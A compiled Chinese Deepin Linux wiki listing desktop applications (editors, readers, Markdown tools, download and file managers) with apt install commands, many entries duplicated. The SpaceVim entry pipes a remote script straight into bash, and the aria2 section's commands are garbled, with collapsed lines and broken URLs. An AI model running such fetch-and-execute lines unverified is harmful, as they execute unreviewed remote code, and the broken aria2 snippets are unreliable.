FocusWriter是一款写作软件，为了让您的写作空间尽可能的多且不受打扰，FocusWriter将几乎所有的工具栏都自动隐藏在屏幕边缘。利用FocusWriter写作便利流畅，您还可以设置闹钟和每日任务，非常适合撰稿人、小说写手、剧本作家使用。

`sudo apt-get install focuswriter`

`sudo apt-get remove focuswriter`

[http://packages.deepin.com/deepin/pool/main/f/focuswriter/](http://packages.deepin.com/deepin/pool/main/f/focuswriter/)

FocusWriter是一款写作软件，为了让您的写作空间尽可能的多且不受打扰，FocusWriter将几乎所有的工具栏都自动隐藏在屏幕边缘。

利用FocusWriter写作便利流畅，您还可以设置闹钟和每日任务，非常适合撰稿人、小说写手、剧本作家使用。

安装

sudo apt-get install focuswriter

卸载

sudo apt-get remove focuswriter

仓库地址

http://packages.deepin.com/deepin/pool/main/f/focuswriter/

标题：GNU_TeXmacs
GNU TeXmacs是一个优秀的科学文档排版软件，您可以不通过编译直接导出为PDF格式的文件，也可以导入和导出为TeX、HTML格式的文件。其完全可视化的表格和公式编辑环境、结构化的浏览功能，将带给您真正的“所见即所得”的体验。

sudo apt-get install texmacs

sudo apt-get remove texmacs

http://packages.deepin.com/deepin/pool/main/t/texmacs/

标题：Scribus
Scribus是一款电子杂志制作软件，可以用来制作个人文件、邮件列表、电子杂志类型的电子文档，具有编写档案专业品质图像设置设备的能力，还可以创建动画和互动的PDF图像和形式。

sudo apt-get install scribus

sudo apt-get remove scribus

http://packages.deepin.com/deepin/pool/main/s/scribus/

标题：Texmaker
Texmaker是一个LaTeX的编辑环境，已经集成了所需的开发工具，包括许多LaTeX文档，非常适合需要经常编辑LaTeX公式的人员。安装使用`sudo apt-get install texmaker`命令。卸载使用`sudo apt-get remove texmaker`命令。仓库地址是[http://packages.deepin.com/deepin/pool/non-free/t/texmaker/](http://packages.deepin.com/deepin/pool/non-free/t/texmaker/)。常见问题暂无内容。相关链接包含维基百科。

标题：ChmSee
ChmSee是一个在Linux下阅读CHM格式帮助文件的软件，对中文支持良好，目前支持简体和英文编码的CHM文件。chmsee具有与Firefox类似的分页浏览标签，能够自动检测编码，可以收藏书签，以及设置字体等。安装ChmSee的命令是：sudo apt-get install chmsee。卸载ChmSee的命令是：sudo apt-get remove chmsee。ChmSee的仓库地址是http://packages.deepin.com/deepin/pool/main/c/chmsee/。ChmSee的相关链接包括维基百科。

标题：Comix
Comix是一款优秀的连环画电子阅读器。如果您有很多精美的电子连环画，需要一个功能强大的工具来阅读的话，那么Comix是您的不二选择。Comix也可以作为一般的图像查看器来使用，它支持从zip、rar、tar等压缩包中直接读取图像文件。

sudo apt-get install comix

sudo apt-get remove comix

http://packages.deepin.com/deepin/pool/main/c/comix/

标题：Koodo Reader
Koodo Reader 是一款开源、跨平台的电子书阅读软件，支持 .epub、.pdf、.mobi、.txt、.doc(x) 、.rtf、.htm(l) 等多种格式，支持深色模式，支持自定义源文件夹和自动同步电子书。

wget https://ghproxy.com/https://github.com/troyeguo/koodo-reader/releases/download/v1.3.9/Koodo.Reader-1.3.9.deb sudo apt install ./Koodo.Reader-1.3.9.deb

sudo apt remove --purge koodo-reader

Koodo Reader 官方网站：https://koodo.960960.xyz/zh Koodo Reader Github 主页：https://github.com/troyeguo/koodo-reader

标题：Qpdfview
qpdfview是一个小巧的PDF阅读器，它能浏览各种PDF格式的文件，并且可以对PDF文件进行标注、打印和管理。qpdfview可以随意切换到全屏阅读模式，其精准的搜索文本功能，将让您的阅读更轻松、更省事。

sudo apt-get install qpdfview

sudo apt-get remove qpdfview

http://packages.deepin.com/deepin/pool/main/q/qpdfview/

标题：文档查看器
Evince（文档查看器）是一个支持多种格式的文件浏览器，可以用来阅读如PDF、Postscript、djvu、tiff、dvi等格式的文件。evince还具有文档的索引支持、加密文档的查看和打印支持等功能。通过evince的书签和缩略图功能，您可以很方便的查看页面。

安装Evince的命令是`sudo apt-get install evince`

卸载Evince的命令是`sudo apt-get remove evince`

Evince的仓库地址是http://packages.deepin.com/deepin/pool/main/e/evince/

标题：福昕阅读器
福昕阅读器（Foxit Reader）是一款PDF文档阅读器，对中文的支持度非常高。福昕阅读器作为全球最流行的PDF阅读器，能够快速打开、浏览、审阅、注释、签署及打印任何PDF文件。

福昕阅读器的安装命令为：sudo apt-get install foxitreader

福昕阅读器的卸载命令为：sudo apt-get remove foxitreader

福昕阅读器的仓库地址是：http://packages.deepin.com/deepin/pool/main/f/foxitreader/

标题：Calibre
Calibre是一个“一站式”的电子书管理软件，支持EPUB、MOBI、PDF等大多数格式的电子书。您可以把Calibre当做电子书图书馆来进行图书管理，也可以使用它来进行电子书的格式转换、阅读等。

sudo apt-get install calibre

sudo apt-get remove calibre

http://packages.deepin.com/deepin/pool/main/c/calibre/

标题：Mendeley
Mendeley是一款文献管理软件，可以一键抓取网页上的文献信息添加到个人的library中。您还可安装Microsoft Word和Open Office插件，方便在文字编辑器中插入和管理参考文献。Mendeley还免费提供各500M的文献存储和共享空间。

sudo apt-get install mendeleydesktop

sudo apt-get remove mendeleydesktop

http://packages.deepin.com/deepin/pool/non-free/m/mendeleydesktop/

标题：Referencer
Referencer是一款文献管理工具。支持智能网络链接功能，支持从BibTeX库中导入数目文件，可以使用标签对文档进行分类，可以自动检索arXiv，PubMed和CrossRef元数据，支持使用通用的Python脚本语言扩展。

sudo apt-get install referencer

sudo apt-get remove referencer

http://packages.deepin.com/deepin/pool/main/r/referencer/

标题：TagSpaces
TagSpaces是一款文档管理工具，可以帮助您使用标签进行文件的管理。TagSpaces支持给文件添加标签、标记颜色，可以自动将现在、明天、昨天、月、年信息以标签的形式添加进去。

`sudo apt-get install tagspaces`

`sudo apt-get remove tagspaces`

[http://packages.deepin.com/deepin/pool/main/t/tagspaces/](http://packages.deepin.com/deepin/pool/main/t/tagspaces/)

标题：Cmd_Markdown
Cmd Markdown是一款MarkDown编辑器，同时也是一个阅读工具，支持实时同步预览，区分写作和阅读模式，支持在线存储和分享文稿网址。可以编辑工具栏，可以实时保存数据到云端，支持离线模式，支持标签/分类/搜索等操作。

sudo apt-get install cmd-markdown

sudo apt-get remove cmd-markdown

http://packages.deepin.com/deepin/pool/non-free/c/cmd-markdown/

您可以使用Cmd Markdown：整理知识，学习笔记；发布日记，杂文，所见所想；撰写发布技术文稿（代码支持）；撰写发布学术论文（LaTeX 公式支持）

Markdown是一种方便记忆、书写的纯文本标记语言，用户可以使用这些标记符号以最小的输入代价生成极富表现力的文档：譬如您正在阅读的这份文档。它使用简单的符号标记不同的标题，分割不同的段落，**粗体** 或者 *斜体* 某些文字

Markdown可以制作待办事宜Todo列表：支持以PDF格式导出文稿；改进Cmd渲染算法，使用局部渲染技术提高渲染效率；新增Todo列表功能；修复LaTex公式渲染问题；新增LaTex公式编号功能

Cmd Markdown的主界面一分为二，左边为编辑区，右边为预览区，在编辑区的操作会实时地渲染到预览区方便查看最终的版面效果，并且如果你在其中一个区拖动滚动条，另一个区的滚动条会同步到等价的位置。

Cmd Markdown的编辑工具栏位于编辑区顶部，新手可使用鼠标调整格式，同时鼓励使用键盘标记格式以提高书写流畅度。

编辑模式可通过点击编辑工具栏最右侧的拉伸按钮或按下Ctrl + M切换，是极度简洁的写作环境，挪除了所有可能引起分心的元素。

Cmd Markdown会将用户每一次击键的内容保存至云端，编辑工具栏最右侧会提示“已保存”，无需担心浏览器崩溃、机器掉电等情况，下次可继续写作。

离线模式下，Cmd Markdown会在电脑失去网络连接时智能切换，将后续键入的文字保存在本地，网络恢复后传送至云端，即使网络恢复前关闭浏览器或电脑，下次开启时会提醒传送离线保存的文字。

Cmd Markdown的阅读模式可通过阅读工具栏点击图标或按下Ctrl+Alt+M进入，在版面渲染的字体、字号、行间距、前背景色等细节上提升阅读体验和品质。

Cmd Markdown支持标签、分类和搜索，在编辑区任意行首输入“标签： 未分类”可标签文档，标签后的文稿在文件列表（Ctrl+Alt+F）中按标签分类，用户可浏览或搜索标题关键字过滤文稿。

Cmd Markdown的文稿发布和分享可通过点击图标（Ctrl+Alt+P）将当前文稿生成固定链接，在网络上发布、分享给有相同志趣的人。

## 简介

Cmd Markdown是一款MarkDown编辑器，同时也是一个阅读工具，支持实时同步预览，区分写作和阅读模式，支持在线存储和分享文稿网址。可以编辑工具栏，可以实时保存数据到云端，支持离线模式，支持标签/分类/搜索等操作。

## 安装

`sudo apt-get install cmd-markdown`

## 卸载

`sudo apt-get remove cmd-markdown`

## 仓库地址

http://packages.deepin.com/deepin/pool/non-free/c/cmd-markdown/

我们理解您需要更便捷更高效的工具记录思想，整理笔记、知识，并将其中承载的价值传播给他人，**Cmd Markdown** 是我们给出的答案 —— 我们为记录思想和分享知识提供更专业的工具。 您可以使用 Cmd Markdown：
> * 整理知识，学习笔记
> * 发布日记，杂文，所见所想
> * 撰写发布技术文稿（代码支持）
> * 撰写发布学术论文（LaTeX 公式支持）

除了您现在看到的这个 Cmd Markdown 在线版本，您还可以前往以下网址下载：

### [Windows/Mac/Linux 全平台客户端](https://www.zybuluo.com/cmd/)

## 什么是 Markdown

Markdown 是一种方便记忆、书写的纯文本标记语言，用户可以使用这些标记符号以最小的输入代价生成极富表现力的文档：譬如您正在阅读的这份文档。它使用简单的符号标记不同的标题，分割不同的段落，**粗体** 或者 *斜体* 某些文字，更棒的是，它还可以

总而言之，不同于其它 *所见即所得* 的编辑器：你只需使用键盘专注于书写文本内容，就可以生成印刷级的排版格式，省却在键盘和工具栏之间来回切换，调整内容和格式的麻烦。**Markdown 在流畅的书写和印刷级的阅读体验之间找到了平衡。** 目前它已经成为世界上最大的技术分享网站 GitHub 和 技术问答网站 StackOverFlow 的御用书写格式。

## 什么是 Cmd Markdown

您可以使用很多工具书写 Markdown，但是 Cmd Markdown 是这个星球上我们已知的、最好的 Markdown 工具——没有之一 ：）因为深信文字的力量，所以我们和你一样，对流畅书写，分享思想和知识，以及阅读体验有极致的追求，我们把对于这些诉求的回应整合在 Cmd Markdown，并且一次，两次，三次，乃至无数次地提升这个工具的体验，最终将它演化成一个 **编辑/发布/阅读** Markdown 的在线平台——您可以在任何地方，任何系统/设备上管理这里的文字。

### 1. 实时同步预览

我们将 Cmd Markdown 的主界面一分为二，左边为**编辑区**，右边为**预览区**，在编辑区的操作会实时地渲染到预览区方便查看最终的版面效果，并且如果你在其中一个区拖动滚动条，我们有一个巧妙的算法把另一个区的滚动条同步到等价的位置，超酷！

### 4. 实时的云端文稿

为了保障数据安全，Cmd Markdown 会将您每一次击键的内容保存至云端，同时在 **编辑工具栏** 的最右侧提示 `已保存` 的字样。无需担心浏览器崩溃，机器掉电或者地震，海啸——在编辑的过程中随时关闭浏览器或者机器，下一次回到 Cmd Markdown 的时候继续写作。

### 10. 文稿发布和分享

在您使用 Cmd Markdown 记录，创作，整理，阅读文稿的同时，我们不仅希望它是一个有力的工具，更希望您的思想和知识通过这个平台，连同优质的阅读体验，将他们分享给有相同志趣的人，进而鼓励更多的人来到这里记录分享他们的思想和知识，尝试点击 <i class="icon-share"></i> (Ctrl+Alt+P) 发布这份文档给好友吧！

再一次感谢您花费时间阅读这份欢迎稿，点击 <i class="icon-file"></i> (Ctrl+Alt+N) 开始撰写新的文稿吧！祝您在这里记录、阅读、分享愉快！

作者 [@ghosert][3]
2016 年 07月 07日

标题：CuteMarkEd
CuteMarkEd是一款Markdown编辑器，它在两侧分别显示代码编辑窗口和预览窗口，预览窗口提供实时的HTML效果展示，支持代码语法高亮显示，带有字数统计和拼写检查功能，可以将文档导出为HTML和PDF。
安装：sudo apt-get install cutemarked
卸载：sudo apt-get remove cutemarked
仓库地址：http://packages.deepin.com/deepin/pool/main/c/cutemarked/

标题：Haroopad
Haroopad是一款Linux平台下的markdown编辑器，它在两侧分别显示代码编辑窗口和预览窗口，具有丰富的主题样式、支持语法高亮显示和LaTex数学公式，还可以导出将文档以邮件形式发送到Tumblr和Evernote。

安装命令为：sudo apt-get install haroopad

卸载命令为：sudo apt-get remove haroopad

Haroopad的仓库地址是：http://packages.deepin.com/deepin/pool/non-free/h/haroopad/

标题：MarkMyWords
MarkMyWords是一款markdown编辑器，支持所有markdown基础功能，支持实时预览，语法高亮，支持语法检查，可以检测文件的修改，可以将文件导出为HTML和PDF格式。

sudo apt-get install mark-my-words

sudo apt-get remove mark-my-words

http://packages.deepin.com/deepin/pool/main/m/mark-my-words/

标题：Marp
Marp是一款Markdown编辑器，可以用Markdown语法编写内容，以幻灯片的形式展示，支持PDF格式输出，有三种预览模式和两种样式主题可供选择。

sudo apt-get install marp

sudo apt-get remove marp

http://packages.deepin.com/deepin/pool/main/m/marp/

标题：Moeditor
Moeditor是一款markdown编辑器，极简风格的界面，支持所有markdown基础功能，可以调整视图，设置主题和样式，支持语法检查，可以将文件导出为HTML和PDF格式。

sudo apt-get install moeditor

sudo apt-get remove moeditor

http://packages.deepin.com/deepin/pool/non-free/m/moeditor/

标题：QOwnNotes
QOwnNotes是一款支持Markdown和ownCloud同步的文本编辑器。可以对文本添加注释，支持文字和字符串搜索，搜索结果高亮显示，可以对文件进行加密。笔记和ownCloud服务器同步，可以从ownCloud服务器恢复旧版本和已删除版本。

sudo apt-get install qownnotes

sudo apt-get remove qownnotes

http://packages.deepin.com/deepin/pool/main/q/qownnotes/

安装
`sudo apt-get install qownnotes`
卸载
`sudo apt-get remove qownnotes`

仓库地址
http://packages.deepin.com/deepin/pool/main/q/qownnotes/

标题：Remarkable
Remarkable是一款Markdown编辑器。可以在线预览，有着简洁的用户界面。支持实时预览，支持定义CSS，语法高亮，而且字数实时统计，支持键盘快捷键，可以导出为PDF和HTML。

安装: sudo apt-get install remarkable 卸载: sudo apt-get remove remarkable

仓库地址: http://packages.deepin.com/deepin/pool/non-free/r/remarkable/

标题：WordMark
WordMark是一款MarkDown编辑器，支持Markdown语法，具有图片上传，同步滚动预览，自动保存，主题切换，多种格式导出等功能。可以直接使用在线图床插入配图，支持发布到Wordpress、GitHub、Evernote等平台。

要安装WordMark，请运行命令：sudo apt-get install wordmark。

要卸载WordMark，请运行命令：sudo apt-get remove wordmark。

WordMark的仓库地址是：http://packages.deepin.com/deepin/pool/non-free/w/wordmark/。

标题：GVim
Vim是从vi发展而来的一个文本编辑器，GVim是Vim的图形前端，它是跨平台的编辑器。它具有代码自动完成、编译及快捷键操作，错误跳转、切换输入模式等功能。除多了些图形界面的功能外，其他功能是一样的。详情参考[Vim](/zh/03_按知识点等级划分/01_中阶/Vim)

安装：sudo apt-get install vim-gtk

卸载：sudo apt-get remove vim-gtk

仓库地址：http://packages.deepin.com/deepin/pool/main/v/vim/

Vim是从vi发展而来的一个文本编辑器，GVim是Vim的图形前端，它是跨平台的编辑器。它具有代码自动完成、编译及快捷键操作，错误跳转、切换输入模式等功能。除多了些图形界面的功能外，其他功能是一样的。详情参考Vim。

sudo apt-get install vim-gtk

sudo apt-get remove vim-gtk

http://packages.deepin.com/deepin/pool/main/v/vim/

标题：neovim
Neovim对vim的架构进行了大幅改动，支持lua和python来编写插件，视觉也更美观。vim兼容性强，neovim则是更轻盈，也更适合扩展。安装指令：apt install neovim。卸载指令：apt remove neovim。打开文件方式：nvim 文件（TUI启动）或nvim-qt 文件（GUI启动）。配置文件兼容vim语法，默认路径：1) ~/.neovimrc 2) ~/.config/nvim/init.vim。其他操作基本继承vim。

标题：Spacevim
SpaceVim 是一个社区驱动的模块化的 Vim IDE，以模块的方式组织管理插件以及相关配置，为不同的语言开发量身定制了相关的开发模块，该模块提供代码自动补全， 语法检查、格式化、调试、REPL 等特性。用户仅需载入相关语言的模块即可得到一个开箱即用的 Vim IDE。

安装SpaceVim的命令如下：sudo apt install git curl -sLf https://spacevim.org/cn/install.sh | bash

SpaceVim 的默认配置文件为 ~/.SpaceVim.d/init.toml。

[options]中可设置SpaceVim的主题、背景等。默认主题是gruvbox，背景可取值'dark'或'light'；enable_guicolors控制终端真色，默认true；statusline_separator设置状态栏分割符号，默认'arrow'；buffer_index_type设置顶部标签列表序号类型，有0-4五种；enable_tabline_filetype_icon控制文件类型图标显示；enable_statusline_mode控制状态栏是否显示当前模式。

SpaceVim通过[[layers]]设置模块，启用模块时需指定name及选项，如autocomplete模块；禁用模块需设置enable = false，如shell模块。

SpaceVim可通过[[custom_plugins]]添加自定义插件，需指定repo，如lilydjwg/colorizer和junegunn/vader.vim，merged设为false。

SpaceVim的快速上手教程链接：https://spacevim.org/cn/quick-start-guide/；入门教程链接：https://everettjf.gitbooks.io/spacevimtutorial/content/

安装
sudo apt install git
curl -sLf https://spacevim.org/cn/install.sh | bash

常见问题
Spacevim 快速上手教程：https://spacevim.org/cn/quick-start-guide/
Spacevim 入门教程：https://everettjf.gitbooks.io/spacevimtutorial/content/

标题：Atom
Atom是一个在线文本编辑器，它具有简洁和直观的图形界面，还支持CSS，HTML，JavaScript等网页编程语言，同时具有宏自动完成分屏、集成文件管理器等功能。

安装：sudo apt-get install atom

卸载：sudo apt-get remove atom

仓库地址：[http://packages.deepin.com/deepin/pool/main/a/atom/](http://packages.deepin.com/deepin/pool/main/a/atom/)

标题：GNU_Emacs
GNU Emacs是一个可扩展、定制的文本编辑器，Emacs内置Elisp解释器和热替换机制，具有各种编辑模式、内置文件、全语言以及对应脚本、高度可定制化、丰富的插件管理等功能。

安装GNU Emacs的命令是：sudo apt-get install emacs

卸载GNU Emacs的命令是：sudo apt-get remove emacs

GNU Emacs的仓库地址是：http://packages.deepin.com/deepin/pool/main/e/emacs-defaults/

快捷键约定：“c-a”、“m-w”中“c-”代表Ctrl键、“m-”代表Meta键（一般是Alt键），“a”、“w”则代表普通的字母按键。

文件操作快捷键：C-x c-f 用于打开文件（不关闭当前正在浏览的文件）；c-x c-v 用于打开文件（打开文件并关闭当前正在浏览的文件）；c-x c-s 用于保存文件；c-x k 用于杀死（关闭）文件；c-x c-c 用于关闭文件，退出emacs。

文本编辑快捷键：c-a 使光标跳到行首（根据显示逻辑不同，行首位置可能不同）；c-e 使光标跳到行尾（根据显示逻辑不同，行尾位置可能不同）；c-f 使光标前进一个字符（前进方向为正常打字方向）；m-f 使光标前进一个单词（中文环境下“单词”可能代表一个句子）；c-b 使光标后退一个字符（后退方向为正常打字的反方向）；m-b 使光标后退一个单词（中文环境下“单词”可能代表一个句子）；c-n 使光标下移一行；c-p 使光标上移一行；c-y 用于召回文本（可理解为“粘贴”）；c-d 用于删除光标当前位置的字符；m-d 用于从当前光标处向前移除一个单词（移除的字词可通过c-y召回，删除则不能）。

查询帮助快捷键：c-h t 用于查看emacs教程；c-h k 用于查看快捷键绑定的功能；c-h f 用于输入功能名称，查询所绑定的快捷键和功能描述；c-h w 用于输入功能名称，显示其所有绑定的快捷键。

GNU Emacs是一个可扩展、定制的文本编辑器，Emacs内置Elisp解释器和热替换机制，具有各种编辑模式、内置文件、全语言以及对应脚本、高度可定制化、丰富的插件管理等功能。

文件操作
快捷键 | 功能
C-x c-f | 打开文件（不关闭当前正在浏览的文件）

文件操作
快捷键 | 功能
C-x c-v | 打开文件（打开文件并关闭当前正在浏览的文件）

文本编辑
快捷键 | 功能 | 备注
c-a | 光标跳到行首 | 根据显示逻辑（视觉行或是真实行）不同，行首、行尾的位置是不同的。

文本编辑
快捷键 | 功能 | 备注
c-e | 光标跳到行尾 | 根据显示逻辑（视觉行或是真实行）不同，行首、行尾的位置是不同的。

查询帮助
快捷键 | 功能
c-h k | 查看快捷键绑定的功能

维基百科：

标题：Kate
Kate是一个开源的、先进的文本编辑器，专为桌面环境KDESC设计。包括编辑各种文本文件、语法高亮显示、可扩展XML文件、代码可以折叠/展开显示，动态自动换行。

sudo apt-get install kate

sudo apt-get remove kate

http://packages.deepin.com/deepin/pool/main/k/kate/

标题：KWrite
KWrite是一款程序员非常喜欢的文字编辑器，支持中文显示和输入。KWrite最主要的功能特征是它能对许多程序语言的语法彩色化，如 C/C++、Java、Python、Per、Bash、HTML等。

sudo apt-get install kwrite

sudo apt-get remove kwrite

KWrite的仓库地址是：http://packages.deepin.com/deepin/pool/main/k/kate/

标题：Mousepad
Mousepad是一个的简单的基于GTK+3的文本编辑器，一般Xfce桌面环境都带有。

sudo apt-get install mousepad

sudo apt-get remove mousepad

http://packages.deepin.com/deepin/pool/main/m/mousepad/

官方网站：https://docs.xfce.org/apps/mousepad/start 维基百科：

标题：Notepadqq
Notepadqq是一套纯文字编辑器，与Notepad++非常相似。Notepadqq除了可以用来制作一般的纯文字说明文件，也十分适合当作编写电脑程序的编辑器。Notepadqq支持语法高亮显示，具有搜索、查找/替换、分屏、书签、代码折叠等功能。

sudo apt-get install notepadqq

sudo apt-get remove notepadqq

http://packages.deepin.com/deepin/pool/main/n/notepadqq/

标题：PyRoom
PyRoom是一款文本编辑器，它将带你进入黑底绿字的全屏幕界面。在此界面中，你可以使用快捷键来完成各项编辑任务。PyRoom 允许你同时编辑多份文档，能够自动保存你的编辑工作，你也可以根据自己的喜好对 PyRoom 的默认界面配色进行定制。

`sudo apt-get install pyroom`

`sudo apt-get remove pyroom`

[http://packages.deepin.com/deepin/pool/main/p/pyroom/](http://packages.deepin.com/deepin/pool/main/p/pyroom/)

标题：百度网盘
百度网盘是一款省心、好用的超级云存储产品，已为超过7亿用户提供云服务。空间超大，支持多类型文件的备份、分享、查看和处理。安装命令：sudo apt install com.baidu.baidunetdisk，卸载命令：sudo apt remove --purge com.baidu.baidunetdisk。仓库地址：http://packages.deepin.com/deepin/pool/non-free/b/baidunetdisk/，维基百科链接：https://zh.wikipedia.org/zh-cn/百度网盘，官网：https://pan.baidu.com/。

标题：阿里云盘（第三方）
阿里云盘是一款速度快、不打扰、够安全、易于分享的网盘，你可以在这里存储、管理和探索内容，尽情打造丰富的数字世界。虽然阿里云盘目前没有推出官方的 Linux 的客户端，但第三方开发者 @liupan1890 开发了阿里云盘小白羊版，支持 Linux 操作系统，非常好用。

用浏览器打开 https://wwe.lanzoui.com/iKGsL037ieha 选择一个运营商点击下载 然后右击下载的压缩包，解压到当前文件夹 打开解压的文件夹，双击“阿里云盘小白羊版”，点击运行即可。

删除解压的文件夹即可

在终端执行命令安装MPV：sudo apt install mpv

阿里云盘官网：https://www.aliyundrive.com/ 阿里云盘小白羊版 Github 主页：https://github.com/liupan1890/aliyunpan

标题：aria2下载工具
linux 没有迅雷（有wine版迅雷），那么 linux 上怎么下载 bt 种子呢？使用 aria2 这个命令行工具可以下载。使用方法比较简单，但是它需要经过配置才有速度。

下载文件：<https: ngosang.github.io/trackerslist/trackers_best_ip.txt>，里面就是服务器的列表。保存到：~/.aria2/aria2.conf 配置文件中，内容如下：```ini# 每一个服务器地址用逗号分隔bt-tracker=网址1,网址2,网址3...```但是第一步得到的地址不是以逗号分隔，而是以一个空行分隔。所以自己要修改一下，可以用 kwrite 编辑器，替换"\n\n" 为 ","。

```bash# 获得正确格式的文本curl -o- https://ngosang.github.io/trackerslist/trackers_best_ip.txt|sed -ne '1h; 1!H;${g;s/\n\n/,/g;s/\n g;p}'# 自动更新脚本sed 's@bt-tracker=.*@bt-tracker='$(curl -o- https: ngosang.github.io/trackerslist/trackers_best_ip.txt|sed -ne '1h; 1!H;${g;s/\n\n/,/g;s/\n g;p}')'@g' ~/.aria2/aria2.conf```

dht.dat 是一个很关键的步骤，它的作用就是把可以联通的网络保存起来，那么下次下载的时候用这些网络，自然就提高了速度。否则，你还需要从有限的种子服务器里面获取内容，有个缓慢速度爬坡的过程。

将以下内容写入配置文件：~/.aria2/aria2.conf```ini# aria2配置文件# 保存为 ~/.aria2/dht.datenable-dht=truebt-enable-lpd=trueenable-peer-exchange=true# 以下是 ipv6 支持，保存为 ~/.aria2/dht6.datenable-dht6=true```

关键的一步，你必须要创建一个空的文件，否则它不干活：```bashtouch ~/.aria2/dht.dattouch ~/.aria2/dht6.dat```之后就可以正常的使用 aria2 下载种子了：```bash# 下载指定种子文件aria2c xxx.torrent # 结束之后，可以观察 dht.dat 变大了ls -hl ~/.aria2```

标题：FlareGet-已合并
## 简介

FlareGet是一个跨平台的下载管理器和加速器，它支持多个线程同时下载、多种浏览器集成、抓取网页上视频等功能，同时还支持云存储服务。

## 安装

`sudo apt-get install flareget`

## 卸载

`sudo apt-get remove flareget`

## 仓库地址

[http://packages.deepin.com/deepin/pool/non-free/f/flareget/](http://packages.deepin.com/deepin/pool/non-free/f/flareget/)

## 常见问题

## 相关链接

维基百科：

标题：QBittorrent-已合并
qBittorrent是一个轻量级BitTorrent客户端，它支持文件上传/下载、支持DHT网络、数据交换、文件选择性下载、预览媒体文件、支持Unicode、支持代理连接、远程控制等功能。

sudo apt-get install qbittorrent

sudo apt-get remove qbittorrent

http://packages.deepin.com/deepin/pool/main/q/qbittorrent/

标题：Transmission-1
Transmission是一个BitTorrent客户端软件，它支持速度限制、制作种子、远程控制、磁力链接、数据加密、损坏修复、数据来源交换等功能。

sudo apt-get install transmission

sudo apt-get remove transmission

http://packages.deepin.com/deepin/pool/main/t/transmission/

标题：Transmission-2
简介
Transmission是一种跨平台轻量级的BitTorrent客户端。
安装
`sudo apt-get install transmission-daemon`	安装服务器端
`sudo apt-get install transmission-cli`		安装基于命令行的客户端（可选）
`sudo apt-get install transmission-gtk`		安装基于Gtk的客户端（可选）
`sudo apt-get install transmission-qt`		安装基于Qt的客户端（可选）

卸载
`sudo apt-get remove transmission-daemon`		卸载服务器端
`sudo apt-get remove transmission-cli`		卸载基于命令行的客户端
`sudo apt-get remove transmission-gtk`		卸载基于Gtk的客户端
`sudo apt-get remove transmission-qt`			卸载基于QT的客户端

仓库地址
http://packages.deepin.com/deepin/pool/main/t/transmission/

相关链接
官方网站：https://transmissionbt.com/

标题：UGet-已合并
Uget是一个下载管理器，它支持断点续传、监视剪贴板、Firefox插件、分类/批量下载，还支持从HTML中导入下载地址、命令行下载等功能。安装命令为`sudo apt-get install uget`。卸载命令为`sudo apt-get remove uget`。仓库地址为http://packages.deepin.com/deepin/pool/main/u/uget/。UGet官网链接为https://ugetdm.com/。

标题：Xtreme_Download_Manager-已合并
Xtreme Download Manager是一个P2P文件下载软件，它具有带宽控制系统、上传下载传输速度控制、下载管理智能化、积分系统、强力分享能力、支持DLP、支持多线程和队列管理、自动调节路由器设置等功能。

安装Xtreme Download Manager的命令是：sudo apt-get install xdm

卸载Xtreme Download Manager的命令是：sudo apt-get remove xdm

Xtreme Download Manager的仓库地址是：http://packages.deepin.com/deepin/pool/main/x/xdm/

`sudo apt-get install xdm`

`sudo apt-get remove xdm`

[http://packages.deepin.com/deepin/pool/main/x/xdm/](http://packages.deepin.com/deepin/pool/main/x/xdm/)

标题：Beyond_Compare
Beyond Compare是一款文件/文件夹对比工具，它不仅可以快速比较出两个目录的不同，还可以比较每个文件的内容，而且可以任意显示比较结果。程序内建了文件浏览器，方便您对文件、文件夹、压缩包、FTP网站之间的差异比对以及资料同步等功能。

sudo apt-get install bcompare

sudo apt-get remove bcompare

http://packages.deepin.com/deepin/pool/non-free/b/bcompare/

`sudo apt-get install bcompare`

`sudo apt-get remove bcompare`

标题：Meld
Meld是一款可视化的文件及目录对比/合并工具，通过它可以对两个或三个文件/目录进行对比，并以图形化的方式显示出它们的不同之处，同时提供编辑及合并功能，还支持CVS, Subversion、Bazaar-ng和Mercurial等版本控制工具。

sudo apt-get install meld

sudo apt-get remove meld

http://packages.deepin.com/deepin/pool/main/m/meld/

标题：SmartSynchronize
SmartSynchronize是一款检查文件与目录比较的工具，可以帮助对比两个文件或者两个文件夹的不同之处，文件比较能够检测内部行着色的变化、比较目录并显示每个文件的添加，删除和修改的行数。同时可以帮助您合并一个基本文件的两个独立的变化。

sudo apt-get install smartsynchronize

sudo apt-get remove smartsynchronize

http://packages.deepin.com/deepin/pool/main/s/smartsynchronize/

标题：dolphin
Dolphin 是 KDE 的文件管理器，您可以使用它来浏览硬盘、U 盘、SD 卡和其他存储设备中的内容，也可以方便快捷地创建、移动、删除文件和文件夹。安装命令为：sudo apt-get install dolphin。卸载命令为：sudo apt-get remove dolphin。仓库地址是：http://packages.deepin.com/deepin/pool/main/d/dolphin/。官方网站：https://apps.kde.org/dolphin/

dolphin contains plenty of productivity features that will save you time . the multiple tabs and split view features allow navigating multiple folders at the same time , and you can easily drag and drop files between views to move or copy them . dolphin 's right - click menu provides with many quick actions that let you compress , share , and duplicate files , among many other things . you can also add your own custom actions .

dolphin is very lightweight , but at the same time , you can adapt it to your specific needs . this means that you can carry out your file management exactly the way you want to . dolphin supports three different view modes : a classic grid view of all the files , a more detailed view , and a tree view . you can also configure most of dolphin 's behavior .

dolphin can display files and folders from many internet cloud services and other remote machines as if they were right there on your desktop . dolphin also comes with an integrated terminal that allows you to run commands on the current folder .

you can extend the capabilities of dolphin even further with powerful plugins to adapt it to your workflow . you can use the git integration plugin to interact with git repositories , or the nextcloud plugin to synchronize your files online , and much more . dolphin integration for revision control systems , dropbox , and disk images transparent integration of audio cds with kde plasma and kde applications with data conversion capabilities

标题：DupeGuru
dupeGuru是一款重复文件清理应用，它通过使用模糊匹配算法可以在几分钟内找到电脑中的重复文件，这种算法基于内容分析文件的相似度，当然也可以选择基于文件名，支持指定搜索位置和指定搜索文件的类型，支持多种语言的对比。dupeGuru还有专门的音乐模式和图片模式，用来查找重复的音乐和图片。

sudo apt-get install dupeguru

sudo apt-get remove dupeguru

http://packages.deepin.com/deepin/pool/main/d/dupeguru/

标题：krusader
Krusader 是 twin-panel (commander样式) 的文件管理器，可用于浏览硬盘、U 盘、SD 卡和其他存储设备中的内容，也能方便快捷地创建、移动、删除文件和文件夹。安装命令为 sudo apt-get install krusader，卸载命令为 sudo apt-get remove krusader。仓库地址是 http://packages.deepin.com/deepin/pool/main/k/krusader/，官方网站是 https://sourceforge.net/projects/krusader/。

标题：Nautilus
Nautilus是一款文件管理器，它具有文件的图形化显示，左侧导航管理，文件夹图标分类，快速搜索等功能。

